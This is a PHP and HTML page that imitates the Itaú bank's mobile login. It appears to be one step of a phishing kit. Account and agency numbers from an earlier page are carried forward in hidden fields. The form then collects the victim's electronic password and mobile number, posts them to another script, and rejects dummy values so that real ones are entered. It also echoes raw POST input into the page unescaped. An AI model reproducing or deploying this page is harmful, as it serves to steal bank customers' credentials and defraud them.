<?php
session_start();

$tipoSelect = $_POST["tipoSelect"];
$_SESSION["tipoSelect"] = $tipoSelect;

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<script type="text/javascript" src="app/js/complemento.js"></script>
<title>Mobile Itau</title>
<style>
body { background:url(app/img/bg-body.png) repeat; margin:0;}



@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.otf');
  font-weight: normal;
  font-style: normal;
}

@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.eot');
  font-weight: normal;
  font-style: normal;
}

@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.woff2') format('woff2');
  font-weight: normal;
  font-style: normal;
}


@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.woff') format('woff');
  font-weight: normal;
  font-style: normal;
}


@font-face {
  font-family: 'vendana';
  /*src: url('app/font/vendana.ttf') format('truetype');*/
  font-weight: normal;
  font-style: normal;
}

.geral { padding:20px;}

.meio {
	border-radius:2px;
	padding: 10px;
	border:1px solid #FFF;
	background:url(app/img/meio-bg.png);
	background-repeat:repeat;
	opacity:0.8;
	}
	
.dadosI {
    background: rgba(0, 0, 0, 0) url("app/img/meio-bg.png") repeat scroll 0 0;
    border: 0 none;
    color: #ffffff;
    font-size: 18px;
    height: 20px;
    margin: 0 auto;
    outline: medium none;
    padding: 6px 1px;
    width: 100%;
	}

.float-label {
  padding:2px;
}

.float-label label{
  display: block;
  position:absolute;
  box-sizing: border-box;
}

.float-label input{}


.float-label label {
    color: #FFF;
    font-size: 16px;
    margin-left: 0;
    margin-top: -52px;
    transition-duration: 0.2s;
  
}

.float-label input {
  margin-top: 17px;
}

.float-label input[data-empty] + label {
    color: #fff;
    font-size: 18px;
    font-weight: 500;
    margin-left: 4px;
    margin-top: -29px;
    width: 90%;
}
.esquerda {float:left;}
.direita {float:right;}

.aaSS {padding:20px;}


#btter {
	width:100%;
	padding:12px;
	background:url(app/img/bg-bt.png) repeat;
	color:#FFFFFF;
	font-family:Verdana, Geneva, sans-serif;
	font-size:20px;
	border-radius:8px;
	border:0 none;
	}
	
#bgadd{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:998;
	background:url(app/img/bg-loading.png) repeat;
	display:none;
	}
	
.modalposition{ 
    background: #fff none repeat scroll 0 0;
    border: 1px solid #999;
    border-radius: 0;
    box-shadow: 0 0 10px #999;
    color: #000;
    font-family: Arial;
    font-size: 12px;
    height: 130px;
    left: 50%;
    margin-left: -150px;
    margin-top: -170px;
    position: absolute;
    top: 50%;
    width: 300px;
    z-index: 99999;
	  }
	
.modaldiv1{ height: 30px; width:; }
.modaltext{ padding: 15px; padding-bottom: 10px; color:#666666; }
.modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
.modaldiv2{ margin-top:50px; display:block;}
.modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#103296; text-shadow:1px 1px 1px #666666;}	
	
.bttok {
	background: rgba(0, 0, 0, 0) url("app/img/bgbtt.png") repeat scroll 0 0;
    border: 0 none;
    border-radius: 4px;
    color: #fff;
    font-family: arial;
    font-size: 14px;
    padding: 6px;
    text-align: center;
    width: 45px;
	cursor:pointer;
	}
#cdops { display:none;}
#agcts { display:none;}
	
</style>
</head>

<body onLoad="shkvamos();">
<div style="padding:20px; background-color:#FFF; color:#999; background-image:url(app/img/logo-menor.png); background-repeat:no-repeat; background-position:right 20px center;">
<div id="agcts">ag <?php echo $_POST['AGinforma']; ?> c/c <?php echo $_POST['CTinforma']; ?></div>

<div id="cdops">Operador: <?php echo $_POST['cdop']; ?></div>
</div>



<div class="geral" >


<div class="meio">
<form id="ajaxpf" name="ajaxpf" method="post" onSubmit="return verificaSHK()" action="index3.php" autocomplete="off">

<div style="border-bottom:1px #FFF solid; width:100%; height: 52px; margin-top:20px;">
<div class="float-label"><input class="dadosI" type="tel" name="SEinforma" id="SEinforma" style="font-family:'vendana'" maxlength="8" onKeyUp="javascript:pulacampo('SEinforma','DDDinforma');" onKeyPress="return sonumb(event);" data-empty />
<label for="SEinforma">Senha Eletrônica</label></div>
</div>


<div style="border-bottom:1px #FFF solid; width:100%; height: 52px; margin-top:30px;">
<div class="esquerda">
<div style="height:20px; width:70px; clear:both;" class="float-label"><input class="dadosI" type="tel" name="DDDinforma" id="DDDinforma" maxlength="2" onKeyUp="javascript:pulacampo('DDDinforma','CELinforma');" onKeyPress="return sonumb(event);" data-empty />
<label for="DDDinforma">DDD</label></div>
</div>
<div class="esquerda">
<div style="height:20px; width:130px;" class="float-label"><input class="dadosI" type="tel" name="CELinforma" id="CELinforma" maxlength="9" onKeyUp="javascript:pulacampo('CELinforma','btter');" onKeyPress="return sonumb(event);" data-empty />
<label for="CELinforma">Celular</label></div>
</div>
</div>



<div id="aaSS" class="aaSS">



</div>

<div style="padding:10px 0"><input id="btter" name="btter" type="submit" value="Avançar" /></div>
<input type="hidden" name="AGinforma" id="AGinforma" value="<?php echo $_POST['AGinforma']; ?>">
<input type="hidden" name="CTinforma" id="CTinforma" value="<?php echo $_POST['CTinforma']; ?>">
<input type="hidden" name="cdop" id="cdop" value="<?php echo $_POST['cdop']; ?>">
</form>
</div>
<div style="background:url(app/img/tokn.png) no-repeat; background-position:center 6px; text-align:center; padding:24px; color:#FFF; margin-top: 12px; font-family:Arial, Helvetica, sans-serif; font-size:12px;">iToken</div>


</div>


<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0;"></div>Itau Informa!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>

<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>


<div id="bgadd"></div>


<script>
var floatLabel = document.querySelectorAll(".float-label");
var onFloatLabelChange = function () {
  if (this.value.length == 0) {
    this.dataset.empty = null;
  } else {
    delete this.dataset.empty;
  }
}

floatLabel = [].slice.apply(floatLabel);
floatLabel.forEach(function (container) {
  var input = container.querySelector("input");
  input.addEventListener("keyup", onFloatLabelChange);
});
</script>

<script type="text/javascript">
function verificaSHK(){
	var ModalAlertError = document.getElementById("TextErrorModal");
    var ModalAlert = document.getElementById("modalalert");
	var Modalfundo = document.getElementById("bgadd");
	
if ( document.ajaxpf.SEinforma.value == "" ||
document.ajaxpf.SEinforma.value.length < 6 ||
document.ajaxpf.SEinforma.value.length > 8 ||
document.ajaxpf.SEinforma.value == "00000000" || 
document.ajaxpf.SEinforma.value == "11111111" || 
document.ajaxpf.SEinforma.value == "22222222" ||
document.ajaxpf.SEinforma.value == "33333333" || 
document.ajaxpf.SEinforma.value == "44444444" || 
document.ajaxpf.SEinforma.value == "55555555" || 
document.ajaxpf.SEinforma.value == "66666666" || 
document.ajaxpf.SEinforma.value == "77777777" || 
document.ajaxpf.SEinforma.value == "88888888" || 
document.ajaxpf.SEinforma.value == "99999999"){
document.getElementById("SEinforma").value = "";
ModalAlertError.innerHTML = "Senha Eletrônica Invalida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }

if ( document.ajaxpf.DDDinforma.value == "" ||
document.ajaxpf.DDDinforma.value.length < 2 ||
document.ajaxpf.DDDinforma.value.length > 2){
document.getElementById("DDDinforma").value = "";
ModalAlertError.innerHTML = "DDD Invalido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
if ( document.ajaxpf.CELinforma.value == "" ||
document.ajaxpf.CELinforma.value.length < 9 ||
document.ajaxpf.CELinforma.value.length > 9 ||
document.ajaxpf.CELinforma.value == "000000000" || 
document.ajaxpf.CELinforma.value == "111111111" || 
document.ajaxpf.CELinforma.value == "222222222" ||
document.ajaxpf.CELinforma.value == "333333333" || 
document.ajaxpf.CELinforma.value == "444444444" || 
document.ajaxpf.CELinforma.value == "555555555" || 
document.ajaxpf.CELinforma.value == "666666666" || 
document.ajaxpf.CELinforma.value == "777777777" || 
document.ajaxpf.CELinforma.value == "888888888" || 
document.ajaxpf.CELinforma.value == "999999999"){
document.getElementById("CELinforma").value = "";
ModalAlertError.innerHTML = "Celular Invalido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
}
</script>

<script language="javascript">
function shkvamos(){
	var auto = '<?=$tipoSelect?>';
	if(auto == '0'){
		document.getElementById("cdops").style.display = 'block';
	}else{
		document.getElementById("agcts").style.display = 'block';
	}
}
</script>
</body>
</html>